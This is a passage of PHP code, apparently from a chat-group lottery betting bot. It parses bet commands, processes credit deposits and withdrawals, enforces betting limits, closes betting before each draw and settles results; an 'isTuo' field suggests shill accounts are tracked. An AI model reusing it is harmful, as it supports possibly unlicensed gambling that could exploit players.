                                db('rbuser')->where('wxid', $val['name'])->where('uid', $val['rid'])->setInc('score', $val['score']);
                                $hasOrder = true;
                                db('record')->where('id', $val['id'])->delete();
                                $m = $m + $val['score'];
                                $allStr .= '取消 ' . $val['text'] . '，返回' . floatval($val['score']) . '
';
                            }
                        }
                    }
                    $allStr .= '剩余 ' . sprintf('%.1f', $wan['score'] + $m);
                    if ($hasOrder) {
                        $istId = addMsg($wan, $admin, $allStr, $data['qh']);
                        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', ' . $usre['cancel'] . '秒内有效指令已全部取消!', $data['qh']);
                    } else {
                        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', ' . $usre['cancel'] . '秒内无有效指令!', $data['qh']);
                    }
                } else {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', ' . $usre['cancel'] . '秒内无有效指令!', $data['qh']);
                }
            }
        } elseif (trim($frist) == '上' && is_numeric($last)) {
            addCmd($wan, $admin, $data['cmd'], $data['qh']);
            $hasShang = db('folder')->where(['wxid' => $wan['wxid'], 'nickName' => $wan['NickName'], 'uid' => $admin['UserName'], 'rid' => $wan['uid'], 'status' => 0, 'type' => 0])->find();
            if ($hasShang) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 上分无效!', $data['qh']);
            } else {
                $oid = addJifen($wan, $admin, $last, 0);
                $istId = addMsg3($wan, $admin, $last, '@' . $data['dluser'] . ', 上分' . $last . ',待审批!', $data['qh'], 'shang', $oid);
            }
        } elseif (trim($frist) == '下' && is_numeric($last)) {
            addCmd($wan, $admin, $data['cmd'], $data['qh']);
            if ($wan['score'] < $last) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 您当前积分不足' . $last . '!', $data['qh']);
            } else {
                $hasShang = db('folder')->where(['wxid' => $wan['wxid'], 'nickName' => $wan['NickName'], 'uid' => $admin['UserName'], 'rid' => $wan['uid'], 'status' => 0, 'type' => 1])->find();
                if ($hasShang) {
                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 下分无效!', $data['qh']);
                } else {
                    $oid = addJifen($wan, $admin, $last, 1);
                    $istId = addMsg3($wan, $admin, $last, '@' . $data['dluser'] . ', 下分' . $last . ',待审批!, 剩' . sprintf('%.0f', ($wan['score'] - $last)), $data['qh'], 'xia', $oid);
                }
            }
        } elseif ((strtotime($open['dtOpen']) - time() < $usre['fengpan']) || cache('feng' . $usre['id'] . $wan['gid']) || (0 > (strtotime($open['dtOpen']) - time())) || (strtotime($open['dtOpen']) - time() > 600) || $usre['isOpen']==0) {
        //    addCmd($wan, $admin, $data['cmd'], $data['qh']);
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 已封盘暂停下注!', $data['qh']);
        } elseif (strstr($arr[0], '.') || strstr($arr[0], '=') || strstr($arr[0], '+') || strstr($arr[0], ' ')) {
        //    addCmd($wan, $admin, $data['cmd'], $data['qh']);
            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 指令格式不正确(0)!', $data['qh']);
        } elseif (count($huan) > 1 || count($kong) > 1) {
            $duo = false;
            $moneyData = [];
            $zongxiaList = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->sum('score');
            $istId = addCmd($wan, $admin, $data['cmd'], $data['qh']);
            $wan['istId'] = $istId;
            $xiaList = [];
            $totalM = 0;
            $duoArr = count($huan) > 1 ? $huan : $kong;
            $game = db('rbgame')->where('gameType', $wan['gid'])->find();
            if ($wan['gid'] === 75) {
                foreach ($duoArr as $value) {
                    $map['text'] = array('like', array('%' . str_replace($data['je'], "", $value) . '%'), 'OR');
                    $money = $data['je'];
                    $xian = 20000;
                    $duo = xiazhu3($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $value, $usre, false, 0, $money);
                    if (!$duo['bol']) {
                        return $duo['id'];
                    } else {
                        array_push($xiaList, ['m' => $money, 'cmd' => $value, 'd' => $money]);
                        $totalM += $money;
                    }
                }
            } else {
                foreach ($duoArr as $value) {
                    $str = $value;
                   // 玩法打印
                    echo $str . PHP_EOL;
                    if (($wan['gid'] == 17 || $game['wf']) && strstr($str, '/')) {
                    if($game['wf']==''){
                            $wfArr = explode('/', $str);
                            unset($wfArr[0]);
                            $str = implode('/', $wfArr);
                       }else{
                             $str = str_replace($game['wf'].'/', '', $str);
                       }
                    }
                    $frist = mb_substr($str, 0, 1, "UTF-8");
                    $last = mb_substr($str, 1, strlen($str), "UTF-8");
                    $arr = explode('/', $str);
                    // 玩法打印
                    var_dump($arr);
                    if (strstr($str, '特') && $frist != '特' && $wan['gid'] != '5') {
                        $arr3 = explode('特', $str);
                        $isTrue = 0;
                        $isTe = true;
                        $xian = $usre['te'];
                        if (is_numeric($arr3[0])) {
                            $ma = $arr3[0] . '特';
                            $wf = db('rbwf')->where('name', $ma)->find();
                            if ($wf && is_numeric($arr3[1])) {
                                $money = $arr3[1];
                                $map['text'] = array('like', array('%特%'), 'OR');
                                $xiaList2 = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->select();
                                $xiaListNum = 0;
                                foreach ($xiaList2 as $value) {
                                    $te = explode('特', $value['text']);
                                    if (strstr($te[0], '/')) {
                                        $te2 = explode('/', $te[0]);
                                        foreach ($te2 as $val) {
                                            if ((string)$val == (string)$arr3[0]) {
                                                $xiaListNum += $te[1];
                                                break;
                                            }
                                        }
                                    } else {
                                        if ((string)$te[0] == (string)$arr3[0]) {
                                            $xiaListNum += $te[1];
                                        }
                                    }
                                }
                                if ($xian < ($money + $xiaListNum)) {
                                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $arr3[0] . '特" 超出此玩法最大投注限额，1最多可下' . ($xian - $xiaListNum), $data['qh']);
                                    return $istId;
                                } else {
                                    $isTrue = 1;
                                }
                            }
                        } elseif (strstr($arr3[0], '/') || strstr($arr3[0], '-')) {
                            $arr4 = strstr($arr3[0], '/') ? explode('/', $arr3[0]) : explode('-', $arr3[0]);
                            if (count($arr4) != count(array_unique($arr4))) {
                                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 不能下注相同号码!', $data['qh']);
                                return $istId;
                            } else {
                                $ma = $arr3[0];
                                foreach ($arr4 as $k => $val) {
                                    $wf = db('rbwf')->where('name', $val . '特')->find();
                                    if ($wf) {
                                        $map['text'] = array('like', array('%特%'), 'OR');
                                        $xiaList2 = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->select();
                                        $xiaListNum = 0;
                                        foreach ($xiaList2 as $value) {
                                            $te = explode('特', $value['text']);
                                            if (strstr($te[0], '/')) {
                                                $te2 = explode('/', $te[0]);
                                                foreach ($te2 as $v) {
                                                    if ((string)$v == (string)$val) {
                                                        $xiaListNum += $te[1];
                                                    }
                                                }
                                            } elseif (strstr($te[0], '-')) {
                                                $te2 = explode('-', $te[0]);
                                                foreach ($te2 as $v) {
                                                    if ((string)$v == (string)$val) {
                                                        $xiaListNum += $te[1];
                                                    }
                                                }
                                            } else {
                                                if ((string)$te[0] == (string)$val) {
                                                    $xiaListNum += $te[1];
                                                }
                                            }
                                        }
                                        if ($xian < ($arr3[1] + $xiaListNum)) {
                                            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $val . '特" 超出此玩法最大投注限额，2最多可下' . ($xian - $xiaListNum), $data['qh']);
                                            return $istId;
                                        } else {
                                            $isTrue = 1;
                                        }
                                    } else {
                                        $isTrue = 0;
                                        break;
                                    }
                                }
                                $money = $arr3[1] * count($arr4);
                                $map['text'] = [];
                            }
                        }
                        if ($isTrue == 0) {
                            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', "' . $str . '" 指令格式不正确(1)!', $data['qh']);
                            return $istId;
                        } elseif ($isTrue == 1) {
                            $duo = xiazhu3($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe, $arr3[1], $money);
                            if (!$duo['bol']) {
                                return $duo['id'];
                            } else {
                                array_push($xiaList, ['m' => $money, 'cmd' => $str, 'd' => $arr3[1], 'ma' => $ma]);
                                $totalM += $money;
                            }
                        }
                    } else {
                        list($money, $ma, $xian, $map) = getWfArr($str, $arr, $usre, [], $str, $str, 0, $frist, $last);
                        $wf = db('rbwf')->where('name', $ma)->find();
                        //var_dump($wf);
                       // var_dump($arr);
                      //  var_dump(array('wf'=>$wf,'arr'=>$arr));
                       // echo 'money='.$money.'xian='.$xian.PHP_EOL;
                        if ($wf && is_numeric($money) && $xian > 0 && $xian > 0 && count($arr) <= 2) {
                            if (isset($moneyData[$ma])) {
                                $moneyData[$ma] += $money;
                            } else {
                                $moneyData[$ma] = $money;
                            }

                            $duo = xiazhu3($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre,false,0, $moneyData[$ma]);
                          
                            if (!$duo['bol']) {
                                return $duo['id'];
                            } else {
                                array_push($xiaList, ['m' => $money, 'cmd' => $str, 'd' => $money, 'ma' => $ma]);
                                $totalM += $money;
                            }
                        }
                    }
                }
            }
            if ($wan['score'] < $totalM) {
                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 您当前积分不足' . $totalM . '!', $data['qh']);
            } else {
                $xiaM = 0;
                $cmd = [];
                $oldM = $wan['score'];
                foreach ($xiaList as $k => $value) {
                    $user = db('rbuser')->where('wxid', $data['wxid'])->find();
                    $sdec = db('rbuser')->where('wxid', $data['wxid'])->where('uid', $wan['uid'])->setDec('score', $value['m']);
                    if ($sdec > 0) {
                        $wan['score'] = $user['score'];
                        $addId = addDan4($wan, $admin, $value['m'], $value['cmd'], $data['qh'], $value['d'], 0, $value['ma']);                        
                        $xiaM += intval($value['m']);
                        array_push($cmd, $value['cmd']);
                    }
                }
                $wan['score'] = $oldM;
                $istId = addDan2($wan, $admin, $xiaM, $str, $data['qh']);
            }
        } else {
            $errid = 0;
            $game = db('rbgame')->where('gameType', $wan['gid'])->find();
            $zongxiaList = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->sum('score');
            if ($wan['gid'] === 75) {
                $istId = addCmd($wan, $admin, $data['cmd'], $data['qh']);
                $wan['istId'] = $istId;
                $map['text'] = array('like', array('%' . str_replace($data['je'], "", $str) . '%'), 'OR');
                $money = $data['je'];
                $xian = 20000;
                $istId = xiazhu($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre);
            } else {
                $errid = addCmd($wan, $admin, $data['cmd'], $data['qh']);
                $wan['istId'] = $errid;
                if (strstr($str, '特') && $frist != '特') {
                    if ($game['hasTe']) {
                        $arr3 = explode('特', $str);
                        $money = $arr3[1];
                        $isTrue = 0;
                        $isTe = true;
                        $xian = $usre['te'];
                        if (is_numeric($arr3[0])) {
                            $ma = $arr3[0] . '特';
                            $wf = db('rbwf')->where('name', $ma)->find();
                            if ($wf && is_numeric($money)) {
                                $map['text'] = array('like', array('%特%'), 'OR');
                                $xiaList = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->select();
                                $xiaListNum = 0;
                                foreach ($xiaList as $value) {
                                    $te = explode('特', $value['text']);
                                    if (strstr($te[0], '/')) {
                                        $te2 = explode('/', $te[0]);
                                        foreach ($te2 as $val) {
                                            if ((string)$val == (string)$arr3[0]) {
                                                $xiaListNum += $te[1];
                                                break;
                                            }
                                        }
                                    } else {
                                        if ((string)$te[0] == (string)$arr3[0]) {
                                            $xiaListNum += $te[1];
                                        }
                                    }
                                }
                                if ($xian < ($money + $xiaListNum)) {
                                    $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $arr3[0] . '特" 超出此玩法最大投注限额，3最多可下' . ($xian - $xiaListNum), $data['qh']);
                                    $isTrue = 2;
                                } else {
                                    $isTrue = 1;
                                }
                            }
                        } elseif (strstr($arr3[0], '/') || strstr($arr3[0], '-')) {
                            $arr4 = strstr($arr3[0], '/') ? explode('/', $arr3[0]) : explode('-', $arr3[0]);
                            $ma = $arr3[0] . '特';
                            if (count($arr4) != count(array_unique($arr4))) {
                                $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 不能下注相同号码!', $data['qh']);
                                return $istId;
                            } else {
                                foreach ($arr4 as $k => $val) {
                                    $wf = db('rbwf')->where('name', $val . '特')->find();
                                    if ($wf) {
                                        $map['text'] = array('like', array('%特%'), 'OR');
                                        $xiaList = db('record')->where('gameType', $wan['gid'])->where('type', 3)->where('wid', $wan['NickName'])->where('rid', $wan['uid'])->where('qihao', $data['qh'])->where('isTuo', 0)->where($map)->select();
                                        $xiaListNum = 0;
                                        foreach ($xiaList as $value) {
                                            $te = explode('特', $value['text']);
                                            if (strstr($te[0], '/')) {
                                                $te2 = explode('/', $te[0]);
                                                foreach ($te2 as $v) {
                                                    if ((string)$v == (string)$val) {
                                                        $xiaListNum += $te[1];
                                                    }
                                                }
                                            } elseif (strstr($te[0], '-')) {
                                                $te2 = explode('-', $te[0]);
                                                foreach ($te2 as $v) {
                                                    if ((string)$v == (string)$val) {
                                                        $xiaListNum += $te[1];
                                                    }
                                                }
                                            } else {
                                                if ((string)$te[0] == (string)$val) {
                                                    $xiaListNum += $te[1];
                                                }
                                            }
                                        }
                                        if ($xian < ($arr3[1] + $xiaListNum)) {
                                            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ' "' . $val . '特" 超出此玩法最大投注限额，4最多可下' . ($xian - $xiaListNum), $data['qh']);
                                            $isTrue = 2;
                                            break;
                                        } else {
                                            $isTrue = 1;
                                        }
                                    } else {
                                        $isTrue = 0;
                                        break;
                                    }
                                }
                                $money = $arr3[1] * count($arr4);
                                $map['text'] = [];
                            }
                        }
                        if ($isTrue == 0) {
                            delCmd($errid);
                            $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 指令格式不正确(2)!', $data['qh']);
                        } elseif ($isTrue == 1) {
                            $istId = xiazhu4($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, $isTe, $arr3[1], $ma);
                        }
                    } else {
                        delCmd($errid);
                        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 指令格式不正确(3)!', $data['qh']);
                    }
                } else {
                    list($money, $ma, $xian, $map) = getWfArr($str, $arr, $usre, [], $str, $str, 0, $frist, $last);
                //    var_dump($xian);
                //    var_dump($map);
                    
                    $wf = db('rbwf')->where('name', $ma)->find();
                    if ($wf && is_numeric($money) && $xian > 0 && $xian > 0 && count($arr) <= 2) {
                        $istId = xiazhu4($wan, $admin, $data, $money, $zongxiaList, $xian, $map, $str, $usre, false, $money, $ma);
                    } else {
                        delCmd($errid);
                        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 指令格式不正确(4)!', $data['qh']);
                    }
                }
            }
        }
    } else {
        $istId = addCmd($wan, $admin, $data['cmd'], $data['qh']);
        $wan['istId'] = $istId;
        $istId = addMsg($wan, $admin, '@' . $data['dluser'] . ', 下注无效2!', $data['qh']);
    }
    return $istId;
}

function getWfArr($str, $arr, $usre, $map, $money, $ma, $xian, $frist, $last)
{
    $jiao = ['12角', '23角', '34角', '14角', '13角', '24角', '12', '23', '34', '14', '13', '24', '21角', '32角', '43角', '41角', '21', '32', '43', '41'];
    if ($frist == '大' || $frist == '小') {
        $map['text'] = array('like', array('%' . $frist . '%'), 'OR');
        $xian = $usre['daxiao'];
        $ma = $frist;
        $money = $last;
    } elseif ($frist == '单' || $frist == '双') {
        if ($frist == '单') {
            $map['text'] = array('like', array('%单%', '13/%', '31/%'), 'OR');
        } else {
            $map['text'] = array('like', array('%双%', '24/%', '42/%'), 'OR');
        }
        $ma = $frist;
        $money = $last;
        $xian = $usre['danshuang'];
    
    } elseif ((strstr($str, '番') && $frist != '番') || (strstr($str, '车') && $frist != '车') || (strstr($str, '推') && $frist != '推') || (strstr($str, '正') && $frist != '正') || (strstr($str, '堂') && $frist != '堂')) {
        $tar = mb_substr($str, 1, 1, "UTF-8");
        $arr3 = explode($tar, $str);
        $money = $arr3[1];
        $ma = $arr3[0] . $tar;
        if ($tar == '车' || $tar == '推') {
            list($kuai, $kuai1, $kuai2, $kuai3, $kuai4, $kuai5, $kuai6) = getCheWf($arr3);
            $xian = $usre['che'];
            //$map['text'] = array('like', array('%' . $arr3[0] . '车%', '%' . $arr3[0] . '推%', '%' . $kuai . '/%', '%' . $kuai2 . '/%', '%' . $kuai3 . '/%', '%' . $kuai4 . '/%', '%' . $kuai5 . '/%', '%' . $kuai6 . '/%'), 'OR');
            $map['text'] = array('like', array('%' . $kuai . '车%', '%' . $kuai . '推%', '%' . $kuai1 . '/%', '%' . $kuai2 . '/%', '%' . $kuai3 . '/%', '%' . $kuai4 . '/%', '%' . $kuai5 . '/%', '%' . $kuai6 . '/%'), 'OR');
        
        } elseif ($tar == '正' || $tar == '堂') {
            if ($arr3[0] == '1') {
                $kuai = '1无3';
            } elseif ($arr3[0] == '2') {
                $kuai = '2无4';
            } elseif ($arr3[0] == '3') {
                $kuai = '3无1';
            } else {
                $kuai = '4无2';
            }
            $xian = $usre['zheng'];
            $map['text'] = array('like', array('%' . $arr3[0] . '正%', '%' . $arr3[0] . '堂%', $kuai . '/%'), 'OR');
        } else {
            $map['text'] = array('like', array('%' . $arr3[0] . $tar . '%'), 'OR');
            $xian = $usre['fan'];
        }
    } elseif (strstr($str, '角') || in_array($arr[0], $jiao)) {
        $arr3 = explode('角', $str);
        if ((strstr($str, '角') && in_array($arr3[0], $jiao)) || (in_array($arr[0], $jiao) && is_numeric($arr[1]) && count($arr) == 2)) {
            if (strstr($str, '角/')) {
                $arr3 = explode('角/', $str);
                $kuai = $arr3[0];
                $money = $arr3[1];
                $ma = $kuai . '角';
            }elseif (strstr($str, '/')) {
                $kuai = $arr[0];
                $money = $arr[1];
                $ma = $kuai . '';
            } else {
                $kuai = $arr3[0];
                $money = $arr3[1];
                $ma = $kuai . '角';
            }
        }
        $map['text'] = array('like', array('%' . $kuai . '角%', $kuai . '/%', '%' . strrev($kuai) . '角%', strrev($kuai) . '/%'), 'OR');        
        $xian = $usre['jiao'];
    } elseif (strstr($str, '严') || strstr($str, '念')) {
        if (strstr($str, '严')) {
            if (strstr($str, '/')) {
                $arr3 = explode('/', $str);
                $arra = explode('严', $arr3[0]);//1改
                $ma = $arra[0].$arra[1].'严';//2改
                $arr3[0] = $arra[0].$arra[1];//3改
            } else {
                $arr3 = explode('严', $str);
                $ma = $arr3[0] . '严';
            }
        } else {
            if (strstr($str, '/')) {
                $arr3 = explode('/', $str);
                $arra = explode('念', $arr3[0]);//1改
                $ma = $arra[0].$arra[1].'念';//2改
                $arr3[0] = $arra[0].$arra[1];//3改
            } else {
                $arr3 = explode('念', $str);
                $ma = $arr3[0] . '念';
            }
        }
        $money = $arr3[1];
        $one = substr($arr3[0], 0, 1);
        $two = substr($arr3[0], 1, 1);
        $map['text'] = array('like', array('%' . $one . '严' . $two . '%', '%' . $one . '念' . $two . '%', '%' . $arr3[0] . '严%', '%' . $arr3[0] . '念%'), 'OR');
        $xian = $usre['nian'];
    } elseif (strstr($str, '/')) {
        $money = $arr[1];
        $ma = $arr[0];
        if (strstr($str, '加')) {
            $xian = $usre['jia'];
            list($kuai, $one, $two) = getJiaWf($arr);
            $map['text'] = array('like', array('%' . $one . '%', '%' . $two . '%', '%' . $kuai . '%'), 'OR');
        } elseif (strstr($str, '通') || strstr($str, '无')) {
            if (strstr($str, '通')) {
                $arr3 = explode('通', $arr[0]);
                $xian = $usre['tong'];
                //$map['text'] = array('like', array('%' . $arr3[0] . '通' . $arr3[1] . '%', '%' . $arr3[1] . '无' . $arr3[0] . '%'), 'OR');
                $map['text'] = array('like', array('%' . $arr3[0] . '通' . $arr3[1] . '%', '%' . $arr3[1] . '无' . $arr3[0] . '%','%' . $arr3[0] . '通' . strrev($arr3[1]) . '%', '%' . strrev($arr3[1]) . '无' . $arr3[0] . '%'), 'OR');
            } else {
                $arr3 = explode('无', $arr[0]);
                if (strlen($arr3[0]) == 2) {
                    $xian = $usre['tong'];
                    //$map['text'] = array('like', array('%' . $arr3[1] . '通' . $arr3[0] . '%', '%' . $arr3[0] . '无' . $arr3[1] . '%'), 'OR');
                    $map['text'] = array('like', array('%' . $arr3[1] . '通' . $arr3[0] . '%', '%' . $arr3[0] . '无' . $arr3[1] . '%','%' . $arr3[1] . '通' . strrev($arr3[0]) . '%', '%' . strrev($arr3[0]) . '无' . $arr3[1] . '%'), 'OR');
                } else {
                    if ($arr[0] == '1无3' || $arr[0] == '2无4' || $arr[0] == '3无1' || $arr[0] == '4无2') {
                        if ($arr[0] == '1无3') {
                            $kuai = '1';
                        } elseif ($arr[0] == '2无4') {
                            $kuai = '2';
                        } elseif ($arr[0] == '3无1') {
                            $kuai = '3';
                        } else {
                            $kuai = '4';
                        }
                        $xian = $usre['zheng'];
                        $map['text'] = array('like', array('%' . $kuai . '正%', '%' . $kuai . '堂%', $arr[0] . '/%'), 'OR');
                    } else {
                        $xian = $usre['jia'];
                        list($kuai, $one, $two) = getJiaWf($arr);
                        $map['text'] = array('like', array('%' . $one . '%', '%' . $two . '%', '%' . $kuai . '%'), 'OR');
                    }
                }
            }
        } elseif (strstr($str, '严') || strstr($str, '念')) {
            if (strstr($str, '严')) {
                $arr3 = explode('严', $arr[0]);
                $ma = $arr3[0]. $arr3[1]. '严';
            } else {
                $arr3 = explode('念', $arr[0]);
                $ma = $arr3[0]. $arr3[1]. '严';
            }
            $map['text'] = array('like', array('%' . $arr3[0] . '严' . $arr3[1] . '%', '%' . $arr3[0] . '念' . $arr3[1] . '%', '%' . $arr3[0] . $arr3[1] . '严%', '%' . $arr3[0] . $arr3[1] . '念%'), 'OR');
            $xian = $usre['nian'];
        } else {
            if (($arr[0] == '13' || $arr[0] == '31') && is_numeric($money)) {
                $map['text'] = array('like', array('%单%', '13/%', '31/%'), 'OR');
                $xian = $usre['danshuang'];
            } elseif (($arr[0] == '24' || $arr[0] == '42') && is_numeric($money)) {
                $map['text'] = array('like', array('%双%', '24/%', '42/%'), 'OR');
                $xian = $usre['danshuang'];
            } else {
                if (is_numeric($money)) {
                    //车限制
                    $arr3 = explode('/', $str);
                    list($kuai, $kuai1, $kuai2, $kuai3, $kuai4, $kuai5, $kuai6) = getCheWf($arr3);
                    $map['text'] = array('like', array('%' . $kuai . '车%', '%' . $kuai . '推%', '%' . $kuai1 . '/%', '%' . $kuai2 . '/%', '%' . $kuai3 . '/%', '%' . $kuai4 . '/%', '%' . $kuai5 . '/%', '%' . $kuai6 . '/%'), 'OR');
                    $xian = $usre['che'];
                }
            }
        }
    }
    $req = ['money' => $money,'ma' => $ma, 'xian' => $xian,'map' => $map];
   // var_dump($req);
    return [$money, $ma, $xian, $map];
}

function getCheWf($arr3)
{
    if ($arr3[0] == '1' || $arr3[0] == '124' || $arr3[0] == '241' || $arr3[0] == '142' || $arr3[0] == '412' || $arr3[0] == '421' || $arr3[0] == '214') {
        $kuai = '1';
        $kuai1 = '124';
        $kuai2 = '241';
        $kuai3 = '412';
        $kuai4 = '421';
        $kuai5 = '214';
        $kuai6 = '142';
    } elseif ($arr3[0] == '2' || $arr3[0] == '123' || $arr3[0] == '231' || $arr3[0] == '321' || $arr3[0] == '132' || $arr3[0] == '213' || $arr3[0] == '312') {
        $kuai = '2';
        $kuai1 = '123';
        $kuai2 = '231';
        $kuai3 = '321';
        $kuai4 = '132';
        $kuai5 = '213';
        $kuai6 = '312';
    } elseif ($arr3[0] == '3' || $arr3[0] == '234' || $arr3[0] == '243' || $arr3[0] == '324' || $arr3[0] == '342' || $arr3[0] == '423' || $arr3[0] == '432') {
        $kuai = '3';
        $kuai1 = '234';
        $kuai2 = '243';
        $kuai3 = '324';
        $kuai4 = '342';
        $kuai5 = '423';
        $kuai6 = '432';
    } else {
        $kuai = '4';
        $kuai1 = '134';
        $kuai2 = '143';
        $kuai3 = '431';
        $kuai4 = '341';
        $kuai5 = '314';
        $kuai6 = '413';
    }
    return [$kuai, $kuai1, $kuai2, $kuai3, $kuai4, $kuai5, $kuai6];
}

function getJiaWf($arr)
{
    if ($arr[0] == '1无2' || $arr[0] == '1加34' || $arr[0] == '1加43') {
        $kuai = '1无2';
        $one = '1加34';
        $two = '1加43';
    } elseif ($arr[0] == '1无4' || $arr[0] == '1加23' || $arr[0] == '1加32') {
        $kuai = '1无4';
        $one = '1加23';
        $two = '1加32';
    } elseif ($arr[0] == '2无1' || $arr[0] == '2加34' || $arr[0] == '2加43') {
        $kuai = '2无1';
        $one = '2加34';
        $two = '2加43';
    } elseif ($arr[0] == '2无3' || $arr[0] == '2加14' || $arr[0] == '2加41') {
        $kuai = '2无3';
        $one = '2加14';
        $two = '2加41';
    } elseif ($arr[0] == '3无2' || $arr[0] == '3加14' || $arr[0] == '3加41') {
        $kuai = '3无2';
        $one = '3加14';
        $two = '3加41';
    } elseif ($arr[0] == '3无4' || $arr[0] == '3加12' || $arr[0] == '3加21') {
        $kuai = '3无4';
        $one = '3加12';
        $two = '3加21';
    } elseif ($arr[0] == '4无3' || $arr[0] == '4加12' || $arr[0] == '4加21') {
        $kuai = '4无3';
        $one = '4加12';
        $two = '4加21';
    } else {
        $kuai = '4无1';
        $one = '4加23';
        $two = '4加32';
    }
    return [$kuai, $one, $two];
}

function getKj($val)
{
    $type = $val['gameType'];
    $arr = getData($val);
    $sq = $arr['preDrawIssue'];
    if ($sq) {
        db('history')->where('type', $type)->where('Code', '=', '')->where('QiHao', '<', $sq)->delete();
        $qh = $arr['drawIssue'];
        $time = $arr['drawTime'];
        $code = $arr['preDrawCode'];
        $has = db('history')->where('type', $type)->where('QiHao', $qh)->find();
        if (!$has) {
            echo date('Y-m-d H:i:s') . " 采种{$type} = {$sq}开奖结果【{$code}】" . PHP_EOL;
            //开奖延时
            sleep(5);
            db('history')->where('type', $type)->where('QiHao', $sq)->update(['Code' => $code]);
            db('history')->insert(['QiHao' => $qh, 'dtOpen' => $time, 'Code' => '', 'type' => $type]);
            cache('kaijiang' . $type, true);
        }
    }
    $last = db('history')->where('type', $type)->where('Code', '<>', '')->order('id desc')->find();
    if ($last) {
        cache('lastQi' . $type, $last);
    }
    $open = db('history')->where('type', $type)->order('id desc')->find();
    cache('nowQi' . $type, $open);
    $rb = db('robot')->where('isOpen', 1)->where('time', '>', date('Y-m-d'))->select();
    $endTime = $open['dtOpen'];
    $endQh = $open['QiHao'];
    $t = time();
    foreach ($rb as $userVal) {
        $uname = $userVal['UserName'];
        $user = ['uid' => $uname, 'id' => $uname, 'gameType' => $type];
        $admin = ['UserName' => $userVal['uid']];
        if ((0 < (strtotime($endTime) - $t)) && ((strtotime($endTime) - $t) < ($userVal['fengpan'] + 30)) && !cache('last' . $userVal['id'] . $type)) {
            if (!hasSys($type, $endQh, 'last', $uname)) {
                addMsg2($user, $admin, '倒记时30秒', $endQh, 'last', 0);
                cache('last' . $userVal['id'] . $type, true);
                echo $uname . '--' . $type . '--' . "{$endQh}倒记时30秒" . PHP_EOL;
            }
        }
        if ((0 < (strtotime($endTime) - $t)) && ((strtotime($endTime) - $t) < $userVal['fengpan']) && !cache('feng' . $userVal['id'] . $type)) {
            if (!hasSys($type, $endQh, 'kai4', $uname)) {
                $count = 0;
                $all = db('record')->where('gameType', $type)->where('rid', $uname)->where('qihao', $endQh)->where('type', 3)->select();
                foreach ($all as $value) {
                    $count += $value['score'];
                }
$allStr = '-----------
' . $endQh . '
核对列表:(' . $count . ')
';
                if (count($all) > 0) {
                    $all2 = [];
                    for ($i = 0; $i < count($all); $i++) {
                        $wxid2 = substr($all[$i]['name'], 5, 8);
                        if (!in_array($wxid2, $all2)) {
                            $qiu = getQiuWf($type, $all[$i]['qiuNum']);
                            $duoText = $qiu . $all[$i]['text'];
                            for ($j = 0; $j < count($all); $j++) {
                                if ($all[$j]['name'] == $all[$i]['name'] && $all[$j]['id'] !== $all[$i]['id']) {
                                    $qiu = getQiuWf($type, $all[$j]['qiuNum']);
                                    $duoText .= '，' . $qiu . $all[$j]['text'];
                                    array_push($all2, $wxid2);
                                }
                            }
                            $allStr .= '(' . $all[$i]['wid'] . ') "' . $duoText . '"
';
                        }
                    }
                }
                $allStr .= '-----------
以核对列表为准
不在列表都无效';
                addMsg2($user, $admin, $endQh . "期停止", $endQh, 'stop', 0);
                addMsg2($user, $admin, $allStr, $endQh, 'kai4', 0);
                cache('feng' . $userVal['id'] . $type, true);
                echo $uname . '--' . $type . "--期号[{$endQh}]封盘" . PHP_EOL;
            }
        }
    }
}

function openKj($type)
{
    $kj = cache('lastQi' . $type);
    if (cache('kaijiang' . $type) && $kj) {
        $arr = cache('nowQi' . $type);
        $sq = $kj['QiHao'];
        $qh = $arr['QiHao'];
        $time = $arr['dtOpen'];
        $code = $kj['Code'];
        $all = db('record')->where('qihao', $sq)->where('type', 3)->where('gameType', $type)->where('status', 0)->select();
        echo date('Y-m-d H:i:s') . " 采种 {$type} " . " = {$sq}开始结算" . PHP_EOL;
        foreach ($all as $value) {
            jiesuan($value, $kj);
        }
        $rtime = date('Y-m-d');
        $rb = db('robot')->where('isOpen', 1)->where('time', '>', $rtime)->select();
        $game = db('rbgame')->where('gameType', $type)->where('status', 1)->find();
        $game['iskj'] = false;
        $endQh2 = $sq;
        echo date('Y-m-d H:i:s') . " 采种 {$type} " . " = {$qh}开盘" . PHP_EOL;
        $ls = get_ls_index($type);
